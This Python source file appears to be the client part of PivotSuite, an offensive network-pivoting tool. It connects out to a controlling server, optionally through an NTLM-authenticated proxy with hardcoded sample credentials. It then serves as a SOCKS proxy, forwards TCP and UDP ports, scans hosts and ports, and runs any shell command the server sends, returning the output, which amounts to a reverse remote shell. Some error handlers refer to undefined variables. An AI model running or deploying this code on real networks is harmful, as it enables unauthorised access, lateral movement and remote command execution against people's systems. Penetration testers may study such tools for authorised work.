import socket
import select
import subprocess
import os
import logging
from ntlm_auth.ntlm import Ntlm
import re
import threading
import struct
import sys
import ctypes
import six

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
handler.setFormatter(formatter)
logger.setLevel(logging.DEBUG)
logger.addHandler(handler)

HOST, PORT = "localhost", 9999

timeout = 3
SNIFF_MUTEX = 0
UDP_sig 	= {"pivotsuite" : b"\xff\xff\x70\x69\x76\x6f\x74\x73\x75\x69\x74\x65\xff\xff",
              "dns" : b"\x24\x1a\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
              "snmp": b"\x30\x2c\x02\x01\x00\x04\x07\x70\x75\x62\x6c\x69\x63\xA0\x1E\x02\x01\x01\x02\x01\x00\x02\x01\x00\x30\x13\x30\x11\x06\x0D\x2B\x06\x01\x04\x01\x94\x78\x01\x02\x07\x03\x02\x00\x05\x00",
              "ntp" : b"\xe3\x00\x04\xfa\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x4f\x23\x4b\x71\xb1\x52\xf3"
              }

ports_ident	= {"open" 		: [],
                "closed" 	: [],
                "open|filtered"	: []
                }


def sock_proxy(connection):

    if six.PY3:
        header = six.u(connection.recv(1024))
        version, nmethods = struct.unpack("!BB", header[:2])

        connection.sendall(struct.pack("!BB", 5, 0))
        version, cmd, _, address_type = struct.unpack("!BBBB", six.u(connection.recv(4)))

        address = socket.inet_ntoa(six.u(connection.recv(4)))
        port = struct.unpack('!H', six.u(connection.recv(2)))[0]

        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((address, port))
        bind_address = remote.getsockname()

        addr = struct.unpack("!I", socket.inet_aton(bind_address[0]))[0]
        port = bind_address[1]
        reply = struct.pack("!BBBBIH", 5, 0, 0, address_type, addr, port)

        connection.sendall(reply)
    else:
        header = connection.recv(1024)
        version, nmethods = struct.unpack("!BB", header[:2])

        connection.sendall(struct.pack("!BB", 5, 0))
        version, cmd, _, address_type = struct.unpack("!BBBB", connection.recv(4))

        address = socket.inet_ntoa(connection.recv(4))
        port = struct.unpack('!H', connection.recv(2))[0]

        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((address, port))
        bind_address = remote.getsockname()

        addr = struct.unpack("!I", socket.inet_aton(bind_address[0]))[0]
        port = bind_address[1]
        reply = struct.pack("!BBBBIH", 5, 0, 0, address_type, addr, port)

        connection.sendall(reply)

    exchange_loop(connection, remote)


def port_forward(connection,protocol,local_forward,remote_forward,local_ip,local_port,remote_ip,remote_port):

    if protocol == "T":

        if (local_forward is not None) and (remote_forward is not None):
            logger.debug("Chose either Local Port Forwarding OR Remote Port Forwarding")
        elif local_forward is not None:
            server_string = "L:" + remote_ip + ":" + str(remote_port) + ":" + protocol
            if six.PY3:
                connection.send(six.b(server_string))
            else:
                connection.send(server_string)
            logger.debug("[+] TCP Local PORT Forwarding  {}:{} ==>> {}:{}".format(local_ip,local_port,remote_ip,remote_port))
            local_socket = listen_socket(local_ip, local_port)
            client_socket, client_addr = local_socket.accept()
            exchange_loop(connection, client_socket)
        elif remote_forward is not None:
            server_string = "R:" + local_ip + ":" + str(local_port) + ":" + protocol

            if six.PY3:
                connection.send(six.b(server_string))
            else:
                connection.send(server_string)

            logger.debug(
                "[+] TCP Remote PORT Forwarding  {}:{} ==>> {}:{}".format(local_ip, local_port, remote_ip, remote_port))
            remote_socket = connect_socket(remote_ip, remote_port)
            exchange_loop(connection, remote_socket)
        else:
            logger.debug("Choose Correct Port Forwarding Options")

    elif protocol == "U":

        if (local_forward is not None) and (remote_forward is not None):
            logger.debug("Chose either Local Port Forwarding OR Remote Port Forwarding")

        elif local_forward is not None:
            server_string = "L:" + remote_ip + ":" + str(remote_port) + ":" + protocol
            if six.PY3:
                connection.send(six.b(server_string))
            else:
                connection.send(server_string)
            logger.debug(
                "[+] UDP Local PORT Forwarding  {}:{} ==>> {}:{}".format(local_ip, local_port, remote_ip, remote_port))
            server_ip = local_ip
            server_port = local_port
            server_addr = (server_ip, server_port)

            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.bind(server_addr)
            data, addr = udp_socket.recvfrom(1024)
            connection.sendall(data)
            data = connection.recv(1024)
            udp_socket.sendto(data, addr)

            while True:

                # wait until client or remote is available for read
                r, w, e = select.select([connection, udp_socket], [], [])

                if udp_socket in r:
                    data, addr = udp_socket.recvfrom(4096)
                    if connection.sendall(data) is None:
                        pass

                if connection in r:
                    data = connection.recv(4096)
                    if udp_socket.sendto(data, addr) is None:
                        pass

        elif remote_forward is not None:
            server_string = "R:" + local_ip + ":" + str(local_port) + ":" + protocol
            if six.PY3:
                connection.send(six.b(server_string))
            else:
                connection.send(server_string)
            remote_addr = (remote_ip, remote_port)
            logger.debug(
                "[+] UDP Remote PORT Forwarding  {}:{} ==>> {}:{}".format(local_ip, local_port, remote_ip, remote_port))
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data=connection.recv(1024)
            udp_socket.sendto(data,remote_addr)

            while True:
                # wait until client or remote is available for read
                r, w, e = select.select([connection, udp_socket], [], [])

                if udp_socket in r:
                    data, addr = udp_socket.recvfrom(4096)
                    if connection.sendall(data) is None:
                        pass

                if connection in r:
                    data = connection.recv(4096)
                    if udp_socket.sendto(data, remote_addr) is None:
                        pass
        else:
            logger.debug("[-] Incorrect Port Forward Option Specified")

    else:
        logger.debug("[-] Incorrect Protocol Option Specified")


def network_enum(connection):
    try:
        while 1:
            if six.PY3:
                command = six.u(connection.recv(1024))
                command = command.decode('utf-8')
            else:
                command = connection.recv(1024)
            if command == "1":
                if os.name == "posix":
                    result = os_command_exe("ifconfig")
                    connection.sendall(result)
                elif os.name == "nt":
                    result = os_command_exe("ipconfig")
                    connection.sendall(result)

            elif command == "2":
                if six.PY3:
                    connection.sendall(six.b("IP"))
                else:
                    connection.sendall("IP")

                while 1:
                    if six.PY3:
                        ip = six.u(connection.recv(1024)).decode('utf-8')
                    else:
                        ip = connection.recv(1024)

                    if os.name == "posix":
                        command="ping -c 1 "+ip
                        result = os_command_exe(command)
                        connection.sendall(result)

                    elif os.name == "nt":
                        command="ping -n 1 "+ip
                        result = os_command_exe(command)
                        connection.sendall(result)

            elif command == "3":
                if six.PY3:
                    connection.send(six.b("IP"))
                else:
                    connection.send("IP")

                if six.PY3:
                    ip = six.u(connection.recv(1024)).decode('utf-8')
                else:
                    ip = connection.recv(1024)

                if six.PY3:
                    connection.sendall(six.b("PORT"))
                else:
                    connection.sendall("PORT")
                while 1:
                    if six.PY3:
                        port = six.byte2int(connection.recv(1024))
                    else:
                        port = int(connection.recv(1024))

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        if six.PY3:
                            connection.sendall(six.b("Open"))
                        else:
                            connection.sendall("Open")
                    else:
                        if six.PY3:
                            connection.sendall(six.b("Close"))
                        else:
                            connection.sendall("Close")
                    sock.close()

            elif command == "4":
                if six.PY3:
                    connection.send(six.b("IP"))
                    target = six.u(connection.recv(1024)).decode('utf-8')
                    connection.sendall(six.b("PORT"))
                else:
                    connection.send("IP")
                    target = connection.recv(1024)
                    connection.sendall("PORT")
                while 1:
                    if six.PY3:
                        port = six.byte2int(connection.recv(1024))
                    else:
                        port = int(connection.recv(1024))

                    s_thread = threading.Thread(target=packet_sniffer, args=(target,))
                    s_thread.start()

                    udp_scan(target, port)

                    if port in ports_ident["open"]:
                        if six.PY3:
                            connection.sendall(six.b("Open"))
                        else:
                            connection.sendall("Open")
                    elif port in ports_ident["open|filtered"]:
                        if six.PY3:
                            connection.sendall(six.b("Open|Filter"))
                        else:
                            connection.sendall("Open|Filter")
                    else:
                        if six.PY3:
                            connection.sendall(six.b("Close"))
                        else:
                            connection.sendall("Close")

            elif command == "5":
                if six.PY3:
                    connection.send(six.b("COMMAND"))
                else:
                    connection.send("COMMAND")

                COMMAND = connection.recv(1024)

                result = os_command_exe(COMMAND)
                connection.sendall(result)

            else:
                logger.debug("[-] Something Went Wrong")

    except KeyboardInterrupt:
        logger.debug("[]")
        connection.close()
        sys.exit(1)


def packet_sniffer(target):
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sniffer.bind(("0.0.0.0", 0))
    sniffer.settimeout(5)
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # continually read in packets and parse their information
    while (1):
        try:
            raw_buffer = sniffer.recvfrom(65565)[0]

        except:
            if SNIFF_MUTEX == 0 :
                sys.exit(1)

        ip_header = raw_buffer[0:20]
        dst_port = struct.unpack(">h", raw_buffer[0x32:0x34])[0]
        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)

        # Create our IP structure
        version_ihl = iph[0]
        ihl = version_ihl & 0xF
        iph_length = ihl * 4
        src_addr = socket.inet_ntoa(iph[8]);

        # Create our ICMP structure
        buf = raw_buffer[iph_length:iph_length + ctypes.sizeof(ICMP)]
        icmp_header = ICMP(buf)

        # check for the type 3 and code and within our target subnet
        if icmp_header.code == 3 and icmp_header.type == 3 and src_addr == target:
            if dst_port not in ports_ident["closed"]:
                ports_ident["closed"].append(dst_port)


class ICMP(ctypes.Structure):
    _fields_ = [
    ('type',        ctypes.c_ubyte),
    ('code',        ctypes.c_ubyte),
    ('checksum',    ctypes.c_ushort),
    ('unused',      ctypes.c_ushort),
    ('next_hop_mtu',ctypes.c_ushort)
    ]

    def __new__(self, socket_buffer):
        return self.from_buffer_copy(socket_buffer)

    def __init__(self, socket_buffer):
        pass


def os_command_exe(os_command):
    result = subprocess.Popen(os_command, stdout=subprocess.PIPE, shell=True)
    (output, err) = result.communicate()
    return output


def connect_socket(ip,port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((ip, port))
    return connection


def listen_socket(ip,port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.bind((ip,port))
    connection.listen(5)
    return connection


def exchange_loop(client, remote):

    while True:

        # wait until client or remote is available for read
        r, w, e = select.select([client, remote], [], [])

        if client in r:
            data = client.recv(4096)
            if remote.send(data) <= 0:
                break

        if remote in r:
            data = remote.recv(4096)
            if client.send(data) <= 0:
                break


def udp_scan(target, port):

    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        conn.settimeout(timeout)

        if port == 123:
            conn.sendto(UDP_sig["ntp"], (target, port))
        elif port == 53:
            conn.sendto(UDP_sig["dns"], (target, port))
        elif port == 161:
            conn.sendto(UDP_sig["snmp"], (target, port))
        else:
            conn.sendto(UDP_sig["pivotsuite"], (target, port))

        d = conn.recv(1024)

        if len(d) > 0:
            ports_ident["open"].append(port)

    except socket.timeout:
        if port not in ports_ident["closed"]:
            ports_ident["open|filtered"].append(port)

    conn.close()


class NtlmProxyContext(object):

    negotiate_request = '''CONNECT {0}:{1} HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Proxy-Connection: keep-alive
Connection: keep-alive
Proxy-Authorization: NTLM {2}

'''
    authenticate_request = '''CONNECT {0}:{1} HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Proxy-Connection: keep-alive
Connection: keep-alive
Proxy-Authorization: NTLM {2}

'''

    def __init__(self, sock, proxy_ip, proxy_port, username, domain=None, password=None, nthash=None, lmhash=None):
        self._sock = sock
        self._proxy_ip = proxy_ip
        self._proxy_port = proxy_port
        self._username = username
        self._password = password
        self._nthash = nthash
        self._lmhash = lmhash
        self._domain = domain
        self._workstation = socket.gethostname().upper()

    def connect(self, host_port):
        (host, port) = host_port
        ntlm_context = Ntlm(ntlm_compatibility=5)
        negotiate_message = ntlm_context.create_negotiate_message(self._domain, self._workstation).decode()
        resp = None
        try:
            self._sock.connect((self._proxy_ip, self._proxy_port))
            self._sock.send(NtlmProxyContext.negotiate_request.format(host, str(port), negotiate_message))
            resp = self._sock.recv(4096)
        except socket.error :
            print("Caught socket error trying to establish connection to proxy. Code {0}. Msg {1}".format(code, msg))
            raise

        try:
            chal_msg = NtlmProxyContext.get_challenge(resp)
            ntlm_context.parse_challenge_message(chal_msg)
        except TypeError:
            print("Couldn't parse proxy challenge. Code {0}. Msg {1}".format(code, msg))
            if resp is not None:
                print("Challenge contents: {0}".format(resp))
            else:
                print("Challenge contents is 'None'")
            self._sock.close()



        authenticate_message = ntlm_context.create_authenticate_message(user_name=self._username,
                                                                        domain_name=self._domain,
                                                                        password=self._password,
                                                                        nthash=self._nthash,
                                                                        lmhash=self._lmhash).decode()
        resp = None
        try:
            self._sock.send(NtlmProxyContext.authenticate_request.format(host, str(port), authenticate_message))
            resp = self._sock.recv(4096)
        except socket.error:
            print("Caught socket error trying to send challenge response connection to proxy. Code {0}. Msg {1}".format(code, msg))
            self._sock.close()
            raise

        if resp is None:
            print("Received an empty response to the challenge response")
            self._sock.close()


        if 'HTTP/1.1 200 Connection established' in resp:
            #logger.info('Ntlm proxy established connection')
            print(resp)
        elif 'HTTP/1.1 503 Service Unavailable' in resp:
            #print('Ntlm proxy response: Service Unavailable')
            print(resp)
            self._sock.close()
        elif 'HTTP/1.1 407 Proxy Authentication Required' in resp:
            #print('Ntlm proxy authentication failed')
            print(resp)
            self._sock.close()
            sys.exit(1)
        else:
            print('Ntlm proxy unknown error')
            print(resp)
            self._sock.close()

    def __getattr__(self, attribute_name):
        """Defer unknown behaviour to the socket"""
        return getattr(self._sock, attribute_name)

    @staticmethod
    def get_challenge(raw_msg):
        if raw_msg is None:
            return None
        re_res = re.search(r'^Proxy-Authenticate: NTLM (.*)$', raw_msg, re.MULTILINE)
        if re_res is None:
            return None
        else:
            return re_res.group(1)

# Main Function definition


def main(server_host='0.0.0.0', server_port=7777, option="SP", protocol="T", local_forward=None, remote_forward=None, local_ip="0.0.0.0",
         local_port=44,remote_ip="127.0.0.1", remote_port=55, ntlm_proxy_host="172.16.1.7", ntlm_proxy_port=8080, username="manish",
         password="12345", domain="india", hashes=None):
    # server domain to ip conversion
    s = re.match(".*[a-z].*", server_host)
    if s:
        server_ip = socket.gethostbyname(server_host)
    else:
        server_ip = server_host
    if ntlm_proxy_host:
        # server domain to ip conversion
        r = re.match(".*[a-z].*", ntlm_proxy_host)
        if r:
            ntlm_proxy_ip = socket.gethostbyname(ntlm_proxy_host)
        else:
            ntlm_proxy_ip = ntlm_proxy_host
    else:
        ntlm_proxy_ip = ntlm_proxy_host

    server_port = int(server_port)
    local_port = int(local_port)
    remote_port = int(remote_port)

    # NTLM Proxy Authentication Setting Up
    connection = None
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if ntlm_proxy_ip is not None:
            if ntlm_proxy_port is None:
                print('Error. Must specify ntlm proxy port')
                sys.exit(1)
            if hashes is not None:
                if re.match('[a-zA-Z0-9]{32}:[a-zA-Z0-9]{32}', cmd_options.hashes) is None:
                    print('Hash format error. Valid hash format - LMHASH:NTHASH')
                    sys.exit(1)

            logger.debug('Connecting via NTLM proxy at {0}:{1}'.format(ntlm_proxy_ip, ntlm_proxy_port))
            ntlm_con = NtlmProxyContext(connection, proxy_ip=ntlm_proxy_ip,
                                        proxy_port=int(ntlm_proxy_port),
                                        username=username,
                                        domain=domain,
                                        password=password,
                                        nthash=None if hashes is None else hashes.split(':')[1],
                                        lmhash=None if hashes is None else hashes.split(':')[0])

            connection = ntlm_con
        connection.connect((server_ip, server_port))
    except socket.error:
        logger.debug("[-] Network Connection Error")

    except KeyboardInterrupt:
        logger.debug('[-] SIGINT Received. Closing Client and Exiting')
        connection.close()
        sys.exit(0)

    # Server Connection Checking
    try:
        if connection:
            logger.removeHandler(handler)
            logger.debug("[*] Client Connected to PivotSuite Server On {}:{}".format(server_ip, server_port))
            if six.PY3:
                connection.send(six.b(option))
            else:
                connection.send(option)
            reply = connection.recv(1024)
        else:
            logger.debug("[-] PivotSuite Server is Unreachable")
            sys.exit(1)
    except KeyboardInterrupt:
        logger.debug('[-] SIGINT Received. Closing Client and Exiting')
        connection.close()
        sys.exit(0)

    # Calling the Appropriate function according to option
    try:
        if option == "SP":
            sock_proxy(connection)

        elif option == "PF":
            port_forward(connection, protocol, local_forward, remote_forward, local_ip, local_port, remote_ip,
                         remote_port)

        elif option == "NE":
            network_enum(connection)

    except KeyboardInterrupt:
        logger.debug('[-] SIGINT Received. Closing Client and Exiting')
        connection.close()
        sys.exit(0)